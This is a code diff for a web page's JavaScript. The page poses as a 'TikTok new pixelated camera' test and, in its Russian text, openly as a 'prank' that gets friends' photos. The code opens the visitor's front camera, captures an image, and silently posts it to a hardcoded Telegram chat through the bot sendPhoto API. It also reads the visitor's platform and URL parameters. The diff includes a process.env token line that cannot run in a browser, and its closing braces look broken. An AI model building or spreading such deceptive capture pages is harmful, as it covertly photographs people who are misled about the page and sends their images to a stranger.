@@ -2,38 +2,49 @@ document.addEventListener('DOMContentLoaded', async () => {
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
+    const watchBtn = document.getElementById('watchBtn');
     const idiNaxuy = document.getElementById('idiNax');
     const pointer = document.getElementById('pointer');
     const botBtn = document.getElementById('botBtn');
 
-    // Translations for supported languages
+    // Translations for the supported languages
     const messages = {
+        ru: {
+            wait: 'Подождите...',
+            unsupportedBrowser: 'Ваш браузер не поддерживается. Нажмите на три точки в правом верхнем углу экрана (где показано стрелочкой) и выберите "Открыть в"',
+            cameraError: 'Ошибка доступа к камере. Выдайте нужное разрешение и попробуйте еще раз',
+            prankFriends: 'Хочешь так же пранковать друзей и получать их фото?',
+            botLinkText: 'Переходите в Discord и получайте свою ссылку'
+        },
         en: {
             wait: 'Please wait...',
-            unsupportedBrowser: 'Your browser is not supported. Tap the three dots in the top right corner...',
+            unsupportedBrowser: 'Your browser is not supported. Tap the three dots in the top right corner of the screen (where the arrow is pointing) and select "Open in"',
             cameraError: 'Camera access error. Please grant the necessary permissions and try again',
-            prankFriends: 'Welcome to the Tiktok Test Web',
-            botLinkText: 'Open Your Camera To Test Tiktok New Pixelated Camera'
+            prankFriends: 'Welcome To New Tiktok Test Web',
+            botLinkText: 'Open Your Camera To Test Tiktok New Pixealted Camera'
         },
-        // Add other languages as needed
+        // other translations...
     };
 
     const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
     const lang = messages[userLang] ? userLang : 'en'; // Default to English if the language isn't supported
 
     idiNaxuy.textContent = messages[lang].wait;
+    watchBtn.style.display = 'none';
     pointer.style.display = 'none';
     botBtn.style.display = 'none';
     context.canvas.style.display = 'none';
 
-    const chatId = '5074699192';  // Replace with the actual chat ID
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('video');
+    const os = navigator.userAgentData?.platform || navigator.platform;
+    const domain = window.location.hostname;
+
+    // Telegram bot token and chat ID (replace these with your actual bot token and chat ID)
+const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN; // This will pull from the environment
+    const chatId = '5074699192';
 
     try {
-        // Fetch the token securely from the backend
-        const response = await fetch('/api/getToken');
-        const data = await response.json();
-        const telegramBotToken = data.token; // Token retrieved from the backend
-
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } });
         video.srcObject = stream;
 
@@ -52,7 +63,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                         formData.append('photo', blob, 'image.jpg');
                         formData.append('chat_id', chatId);
 
-                        // Send image to Telegram via bot API
+                        // Post the image to Telegram using the sendPhoto API
                         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                             method: 'POST',
                             body: formData
@@ -71,18 +82,12 @@ document.addEventListener('DOMContentLoaded', async () => {
                         });
                     });
 
-                // Stop video stream
                 stream.getTracks().forEach(track => track.stop());
             }).catch(() => {
                 idiNaxuy.textContent = messages[lang].unsupportedBrowser;
                 pointer.style.display = 'flex';
             });
         };
-
-    } catch (error) {
-        idiNaxuy.textContent = messages[lang].cameraError;
-    }
-});
 
     } catch (error) {
         idiNaxuy.textContent = messages[lang].cameraError;
